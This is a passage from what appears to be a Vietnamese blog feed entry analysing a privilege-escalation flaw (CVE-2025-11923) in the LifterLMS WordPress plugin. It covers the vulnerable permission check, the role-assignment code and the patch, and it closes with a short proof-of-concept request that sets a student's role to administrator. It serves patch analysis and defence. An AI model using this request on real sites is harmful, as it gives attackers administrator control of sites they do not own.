noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LifterLMS&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    // $this-&amp;gt;namespace = &amp;#39;llms/v1&amp;#39;&#xA;    // $this-&amp;gt;rest_base = &amp;#39;students&amp;#39;&#xA;    register_rest_route(&#xA;        $this-&amp;gt;namespace,&#xA;        &amp;#39;/&amp;#39; . $this-&amp;gt;rest_base . &amp;#39;/(?P&amp;lt;id&amp;gt;[\d]&amp;#43;)&amp;#39;,&#xA;        array(&#xA;            &amp;#39;args&amp;#39;   =&amp;gt; array(&#xA;                &amp;#39;id&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;Unique identifier for the resource.&amp;#39;, &amp;#39;lifterlms&amp;#39; ),&#xA;                    &amp;#39;type&amp;#39;        =&amp;gt; &amp;#39;integer&amp;#39;,&#xA;                ),&#xA;            ),&#xA;            ...&#xA;            array(&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::EDITABLE, // POST, PUT, PATCH&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;update_item&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;update_item_permissions_check&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; $this-&amp;gt;get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ), // see class-wp-rest-controller.php.&#xA;            ),&#xA;            ...&#xA;            &amp;#39;schema&amp;#39; =&amp;gt; array( $this, &amp;#39;get_public_item_schema&amp;#39; ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với cấu hình trên, API được expose dưới dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/llms/v1/students/{id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đó:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;(?P&amp;lt;id&amp;gt;[\d]+)&lt;/code&gt; là một named regex group, WordPress sẽ tự động parse giá trị này và gán vào URL params.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;WP_REST_Server::EDITABLE&lt;/code&gt; tương đương với các method: &lt;code&gt;POST&lt;/code&gt;, &lt;code&gt;PUT&lt;/code&gt;, &lt;code&gt;PATCH&lt;/code&gt; =&amp;gt; điều này yêu cầu header &lt;code&gt;X-WP-Nonce&lt;/code&gt; trong request&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi có request gửi đến endpoint này với method hợp lệ, WordPress sẽ gọi &lt;code&gt;update_item()&lt;/code&gt;. Tuy nhiên, trước khi hàm này được thực thi, request bắt buộc phải vượt qua bước kiểm tra quyền thông qua &lt;code&gt;update_item_permissions_check()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;    if ( get_current_user_id() === $request[&amp;#39;id&amp;#39;] ) {&#xA;        return true;&#xA;    }&#xA;&#xA;    if ( ! current_user_can( &amp;#39;edit_students&amp;#39;, $request[&amp;#39;id&amp;#39;] ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this student.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    return $this-&amp;gt;check_roles_permissions( $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tại dòng 2, hàm gọi &lt;code&gt;get_current_user_id()&lt;/code&gt; để lấy ID của user đang đăng nhập, sau đó so sánh với giá trị &lt;code&gt;id&lt;/code&gt; được truyền qua URL. Nếu hai giá trị này trùng nhau, nghĩa là người dùng đang chỉnh sửa chính tài khoản của mình, và request được cho phép ngay.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_current_user_id()&lt;/code&gt; chỉ trả về giá trị khác &lt;code&gt;0&lt;/code&gt; khi request đã được xác thực thành công. Việc xác thực này phụ thuộc vào việc request có kèm theo &lt;code&gt;X-WP-Nonce&lt;/code&gt; hợp lệ hay không. Nguyên nhân là vì trong quá trình xử lý REST API, WordPress luôn gọi callback &lt;code&gt;rest_cookie_check_errors&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;941&#34; width=&#34;1700&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nếu không có nonce trong query/body (&lt;code&gt;_wpnonce&lt;/code&gt;) hoặc trong header (X-WP-Nonce) thì user hiện tại sẽ được gán &lt;code&gt;id=0&lt;/code&gt; khiến &lt;code&gt;get_current_user_id()&lt;/code&gt; sẽ trả về 0. Nếu nonce không hợp lệ =&amp;gt; request bị reject hoàn toàn.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/invalid.png&#34; title=&#34;Invalid nonce&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/invalid.png&#34; data-sub-html=&#34;&lt;h2&gt;Invalid nonce&lt;/h2&gt;&lt;p&gt;Invalid nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/invalid.png&#39; alt=&#34;Invalid nonce&#34; height=&#34;560&#34; width=&#34;1563&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Invalid nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Để lấy được REST API nonce, ta cần đăng nhập vào Admin Dashboard và gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt;, vì nonce này chỉ được WordPress inject vào trang khi người dùng đã đăng nhập hợp lệ.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/get_nonce.png&#34; title=&#34;Lấy giá trị của nonce&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;Lấy giá trị của nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;697&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy giá trị của nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi vượt qua được bước kiểm tra quyền, &lt;code&gt;update_item&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item( $request ) {&#xA;    $object = $this-&amp;gt;get_object( $request[&amp;#39;id&amp;#39;] );&#xA;    if ( is_wp_error( $object ) ) {&#xA;        return $object;&#xA;    }&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $item   = $this-&amp;gt;prepare_item_for_database( $request );&#xA;    // Exclude additional fields registered via `register_rest_field()`.&#xA;    $item   = array_diff_key( $item, $this-&amp;gt;get_additional_fields() );&#xA;    $object = $this-&amp;gt;update_object( $item, $request );&#xA;    ...&#xA;    $response = $this-&amp;gt;prepare_item_for_response( $object, $request );&#xA;&#xA;    return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tạo đối tượng student tương ứng với &lt;code&gt;id&lt;/code&gt; được truyền trong request, sau đó gọi &lt;code&gt;update_object()&lt;/code&gt; để cập nhật student với các tham số tương ứng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_object( $prepared, $request ) {&#xA;    $prepared[&amp;#39;ID&amp;#39;] = $prepared[&amp;#39;id&amp;#39;];&#xA;&#xA;    $object_id = wp_update_user( $prepared );&#xA;    if ( is_wp_error( $object_id ) ) {&#xA;        return $object_id;&#xA;    }&#xA;&#xA;    unset( $prepared[&amp;#39;ID&amp;#39;] );&#xA;&#xA;    return $this-&amp;gt;update_additional_data( $object_id, $prepared, $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Biến &lt;code&gt;$prepared&lt;/code&gt; là giá trị trả về của hàm &lt;code&gt;prepare_item_for_database()&lt;/code&gt;. Tuy nhiên, trong quá trình xử lý, field roles — vốn cần thiết để thực hiện tấn công &lt;strong&gt;Privilege Escalation&lt;/strong&gt; — đã bị loại bỏ.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/miss_role.png&#34; title=&#34;Roles đã bị loại khỏi prepare&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/miss_role.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss role&lt;/h2&gt;&lt;p&gt;Roles đã bị loại khỏi prepare&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/miss_role.png&#39; alt=&#34;Miss role&#34; height=&#34;528&#34; width=&#34;787&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Roles đã bị loại khỏi prepare&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;update_additional_data()&lt;/code&gt; được gọi sau khi dữ liệu chính của student đã được cập nhật, nhằm xử lý các dữ liệu mở rộng (additional data) gắn với user nhưng không nằm trong bảng chính.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_additional_data( $object_id, $prepared, $request ) {&#xA;    $object = $this-&amp;gt;get_object( $object_id );&#xA;    ...&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $user = $object-&amp;gt;get_user();&#xA;        $user-&amp;gt;set_role( &amp;#39;&amp;#39; );&#xA;        foreach ( $request[&amp;#39;roles&amp;#39;] as $role ) {&#xA;            $user-&amp;gt;add_role( $role );&#xA;        }&#xA;    }&#xA;&#xA;    return $object;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tạo đối tượng student tương ứng với &lt;code&gt;id&lt;/code&gt; được truyền trong request, sau đó duyệt qua danh sách &lt;code&gt;roles&lt;/code&gt; do client gửi lên và gán từng role cho user.&lt;/p&gt;&#xA;&lt;p&gt;Đây chính là điểm mấu chốt dẫn đến lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã cập nhật lại logic kiểm tra quyền trong &lt;code&gt;update_item_permissions_check()&lt;/code&gt; như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;&#xA;    if ( is_wp_error( ( new WP_REST_Users_Controller() )-&amp;gt;update_item_permissions_check( $request ) ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        return $this-&amp;gt;check_roles_permissions( $request );&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trước tiên, hàm gọi lại &lt;code&gt;update_item_permissions_check()&lt;/code&gt; của &lt;code&gt;WP_REST_Users_Controller&lt;/code&gt; để đảm bảo toàn bộ cơ chế kiểm tra quyền mặc định của WordPress được áp dụng.&lt;/p&gt;&#xA;&lt;p&gt;Nếu hàm này trả về lỗi (&lt;code&gt;WP_Error&lt;/code&gt;), request sẽ bị từ chối ngay lập tức.&lt;/p&gt;&#xA;&lt;p&gt;Nếu request có chứa trường &lt;code&gt;roles&lt;/code&gt;, hệ thống tiếp tục gọi &lt;code&gt;check_roles_permissions()&lt;/code&gt; để kiểm tra quyền gán role.&lt;/p&gt;&#xA;&lt;p&gt;Nếu không có &lt;code&gt;roles&lt;/code&gt;, request được cho phép thực thi.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;check_roles_permissions()&lt;/code&gt; được định nghĩa như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function check_roles_permissions( $request ) {&#xA;&#xA;    global $wp_roles;&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $roles  = array();&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $roles = $request[&amp;#39;roles&amp;#39;];&#xA;    } elseif ( ! empty( $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;] ) ) {&#xA;        $roles = $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;];&#xA;    }&#xA;&#xA;    foreach ( $roles as $role ) {&#xA;&#xA;        if ( ! isset( $wp_roles-&amp;gt;role_objects[ $role ] ) ) {&#xA;            return llms_rest_bad_request_error(&#xA;                sprintf( __( &amp;#39;The role %s does not exist.&amp;#39;, &amp;#39;lifterlms&amp;#39; ), $role )&#xA;            );&#xA;        }&#xA;&#xA;        $potential_role = $wp_roles-&amp;gt;role_objects[ $role ];&#xA;&#xA;        /*&#xA;         * Don&amp;#39;t let anyone with &amp;#39;edit_users&amp;#39; (admins) edit their own role to something without it.&#xA;         * Multisite super admins can freely edit their blog roles -- they possess all caps.&#xA;         */&#xA;        if (&#xA;            ! ( is_multisite() &amp;amp;&amp;amp; current_user_can( &amp;#39;manage_sites&amp;#39; ) )&#xA;            &amp;amp;&amp;amp; get_current_user_id() === $request[&amp;#39;id&amp;#39;]&#xA;            &amp;amp;&amp;amp; ! $potential_role-&amp;gt;has_cap( &amp;#39;edit_users&amp;#39; )&#xA;        ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;&#xA;        // Include admin functions to get access to `get_editable_roles()`.&#xA;        require_once ABSPATH . &amp;#39;wp-admin/includes/admin.php&amp;#39;;&#xA;&#xA;        // The new role must be editable by the logged-in user.&#xA;        $editable_roles = get_editable_roles();&#xA;&#xA;        if ( empty( $editable_roles[ $role ] ) ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cơ chế này đảm bảo:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn kế thừa đầy đủ kiểm tra quyền gốc của WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Không cho phép tự thay đổi role nếu không có quyền tương ứng.&lt;/li&gt;&#xA;&lt;li&gt;Không cho gán role không tồn tại hoặc không nằm trong danh sách role có thể chỉnh sửa.&lt;/li&gt;&#xA;&lt;li&gt;Loại bỏ hoàn toàn khả năng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua REST API.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Student (has valid nonce)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST /wp-json/llms/v1/students/{id}&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;update_item_permissions_check()&amp;#34;]&#xA;&#xA;C --&amp;gt; D{&amp;#34;get_current_user_id() == request.id ?&amp;#34;}&#xA;&#xA;D -- Yes --&amp;gt; E[&amp;#34;Bypass capability checks&amp;#34;]&#xA;D -- No --&amp;gt; F[&amp;#34;Denied&amp;#34;]&#xA;&#xA;E --&amp;gt; G[&amp;#34;update_item()&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;prepare_item_for_database()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;roles field removed from prepared data&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;update_object()&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;update_additional_data()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Read roles directly from request&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;Apply roles via set_role() / add_role()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User role escalated&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng tài khoản student&lt;/li&gt;&#xA;&lt;li&gt;Login vào Admin Dash board và lấy nonce từ browser console thông qua gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/llms/v1/students/8 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: student_cookie&#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;roles=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/result.png&#39; alt=&#34;Result&#34; height=&#34;912&#34; width=&#34;1540&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc &lt;strong&gt;logic kiểm tra quyền và logic cập nhật dữ liệu bị tách rời&lt;/strong&gt;, cho phép trường &lt;code&gt;roles&lt;/code&gt; được xử lý sau khi vượt qua bước kiểm tra ban đầu. Điều này khiến người dùng hợp lệ có thể tự gán quyền cao hơn cho chính mình thông qua REST API, dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&#xA;Bản vá đã khắc phục bằng cách áp dụng đầy đủ kiểm tra quyền của WordPress trước khi cho phép thay đổi role.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không được xử lý dữ liệu nhạy cảm ngoài phạm vi kiểm tra quyền.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;roles&lt;/code&gt; phải luôn được kiểm soát bằng permission gốc của WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra quyền cần gắn chặt với toàn bộ luồng xử lý, không chỉ ở bước đầu.&lt;/li&gt;&#xA;&lt;li&gt;Việc tách logic không đồng bộ có thể dẫn đến leo thang đặc quyền nghiêm trọng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/lifterlms/vulnerability/wordpress-lifterlms-plugin-various-versions-authenticated-student-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin &amp;lt;= 9.1.0 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
